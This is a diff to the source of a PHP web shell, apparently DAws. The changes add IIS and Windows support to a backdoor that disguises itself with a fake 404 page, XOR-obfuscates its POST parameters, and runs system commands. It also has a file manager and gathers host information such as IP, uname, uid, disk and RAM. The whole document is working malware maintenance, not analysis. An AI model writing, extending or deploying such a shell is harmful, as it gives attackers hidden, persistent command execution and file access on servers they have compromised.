@@ -1,10 +1,5 @@
 <?php
 
-if (ob_get_level())
-{
-	ob_end_clean(); //no point of having output buffering on yet
-}
-
 $fake_page = "
 <!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
 <html><head>
@@ -16,7 +11,7 @@ $fake_page = "
 <address>".$_SERVER["SERVER_SOFTWARE"]." Server at ".$_SERVER['SERVER_ADDR']." Port 80</address>
 </body></html>";
 
-session_start();
+@session_start(); //with error supression because using session_start() multiple times was causing an error on IIS
 
 if (!isset($_SESSION["logged_in"]))
 {
@@ -41,6 +36,10 @@ if (!isset($_SESSION["logged_in"]))
 	}
 }
 
+if (ob_get_level())
+{
+	ob_end_clean(); //no point of having output buffering on yet
+}
 
 if (!isset($_SESSION['key'])) //create our session key which will be used for encryption
 {
@@ -426,7 +425,7 @@ if (!isset($_SESSION["daws_directory"]))
 	}
 
 	//finding DAws's directory
-	if (is_writable($daws_dir) && (is_readable($daws_dir)))
+	if ((is_writable($daws_dir)) && (is_readable($daws_dir)))
 	{
 		$_SESSION["daws_directory"] = $daws_dir; //no need to look further since we are in it
 	}
@@ -1791,6 +1790,12 @@ if (isset($_POST['dir'])) //gets the proper value of 'dir'
 {
 	$dir = unxor_this($_POST['dir']);
 	$size = strlen($dir);
+
+	if ($_SESSION["windows"] == True)
+	{
+		$dir = str_replace('\\', '/', $dir); //that's better for Windows
+	}
+
 	while ($dir[$size - 1] == '/')
 	{
 		$dir = substr($dir, 0, $size - 1);
@@ -1799,14 +1804,7 @@ if (isset($_POST['dir'])) //gets the proper value of 'dir'
 }
 else
 {
-	$dir = $_SERVER["SCRIPT_FILENAME"];
-	$size = strlen($dir);
-	while ($dir[$size - 1] != '/')
-	{
-		$dir = substr($dir, 0, $size - 1);
-		$size = strlen($dir);
-	}
-	$dir = substr($dir, 0, $size - 1);
+	$dir = getcwd();
 }
 
 //html, css and js code
@@ -1987,9 +1985,16 @@ function show_div(div_name) //used by the 'rename' form in the file manager to s
 		<td>".php_uname()."</td>
 	</tr>
 	<tr>
-		<td>Server's IP</td>
-		<td>".$_SERVER['SERVER_ADDR']."</td>
-	</tr>";
+		<td>Server's IP</td>";
+	if ($_SERVER['SERVER_ADDR'] != null)
+	{
+		echo "<td>".$_SERVER["SERVER_ADDR"]."</td>";
+	}
+	else //for IIS
+	{
+		echo "<td>".$_SERVER['HTTP_HOST']."</td>";
+	}
+	echo "</tr>";
 
 	if (($_SESSION["windows"] == False) && (installed_php("posix_geteuid"))) //no posix in Windows
 	{
@@ -2013,22 +2018,21 @@ function show_div(div_name) //used by the 'rename' form in the file manager to s
 		<td>".floor((disk_total_space(realpath("/")))/(1073741824))." GB</td>
 	</tr>";
 
-if ($_SESSION["windows"] == True) //not always working and causing the shell to load slowly, maybe later...
+if ($_SESSION["windows"] == True) //causing the shell to load slowly because of the command itself but it's worth it
 {
-	/*
-	$total_memory = execute_command("wmic memorychip get capacity");
-	if ($total_memory != null)
+	$total_amount = execute_command("wmic memorychip get capacity");
+	$total_amount = explode("\n", $total_amount);
+	unset($total_amount[0]);
+	foreach ($total_amount as $amount)
 	{
-		echo "
-		<tr>
-			<td>Total RAM</td>
-			<td>".array_sum($total_memory)/(1073741824)." GB</td>
-		</tr>";
-	}*/
+		$total_memory += $amount;
+	}
+	$total_memory /= 1073741824;
+
 	echo "
 	<tr>
 		<td>Total RAM</td>
-		<td></td>
+		<td>$total_memory GB</td>
 	</tr>";
 }
 else
@@ -2384,7 +2388,7 @@ if (file_exists($dir) && (is_readable($dir)))
 							</form>";
 						}
 
-						if ((is_readable($curr_dir)) && (is_writeable($curr_dir)))
+						if ((is_readable($curr_dir)) && (is_writable($curr_dir)))
 						{
 							echo "
 							<form style='font-color=;display:inline;' action='#File Manager' method='post'>
